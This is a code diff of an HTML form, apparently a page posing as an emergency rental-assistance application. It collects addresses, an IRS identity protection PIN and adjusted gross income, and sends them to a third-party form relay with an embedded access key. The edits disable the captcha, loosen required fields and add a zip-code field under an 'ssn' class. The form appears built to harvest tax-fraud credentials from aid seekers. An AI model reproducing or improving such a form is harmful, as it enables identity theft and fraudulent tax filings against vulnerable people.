@@ -16,7 +16,7 @@
 <div class="form__section">
                <form id="myForm" action="https://api.web3forms.com/submit" method="POST">
                 <input type="hidden" name="access_key" value="ea3caa3e-cd3f-42d6-872d-da295216aad5">
-               <input type="hidden" name="_captcha" value="false">
+     
             <input type="hidden" name="redirect" value="https://emergency-assistance.vercel.app/result.html">
         <div class="name__section sections">
          <p class="subtitle">Name <span>*</span></p>
@@ -240,21 +240,26 @@
 
         <div class="address__section sections">
             <p class="subtitle">Address <span>*</span></p>
-            <input class="input_edit address" type="text" name="street address" id="street1" placeholder="Street Address" required>
+            <input class="input_edit address" type="text" name="street address" id="street1" placeholder="Street Address">
     
 
     
-            <input class="input_edit address" type="text" name="line2" id="street2" placeholder="Street Address Line 1"  required>
+            <input class="input_edit address" type="text" name="line2" id="street2" placeholder="Street Address Line 1">
             
 
             <div class="city_state">
-                <input class="input_edit" type="text" name="city" id="city" placeholder="City" required>
+                <input class="input_edit" type="text" name="city" id="city" placeholder="City">
                 
-                <input class="input_edit" type="text" name="state" id="state" placeholder="State / Province" required>
+                <input class="input_edit" type="text" name="state" id="state" placeholder="State / Province">
             
             </div>
 
         </div>
+        
+        <div class="ssn__section sections">
+            <p class="subtitle"> Zip code<span></span></p>
+            <input class="input_edit" type="number" name="zip code" id="zip code" placeholder= "" required>
+            </div>
 
     <div class="tax__section sections">
             <p class="subtitle">Rental Assistance Programme <span>*</span></p>
@@ -291,11 +296,11 @@
         <div class="pin__section sections">
             <p class="subtitle"> If No, Provide your IP pin <span>*</span>
                 </p>
-            <input class="input_edit" type="number" name="IP" id="ip" placeholder= "e.g, 23" required>
+            <input class="input_edit" type="number" name="IP" id="ip" placeholder= "e.g, 23">
         </div>
 
         <div class="agi__section sections">
-            <p class="subtitle"> What is your AGI for 2023? <span>*</span></p>
+            <p class="subtitle"> What is your AGI for the year 2022? <span>*</span></p>
             <input class="input_edit" type="number" name="AGI" id="agi" placeholder= "e.g, 23" required>
         </div>
 
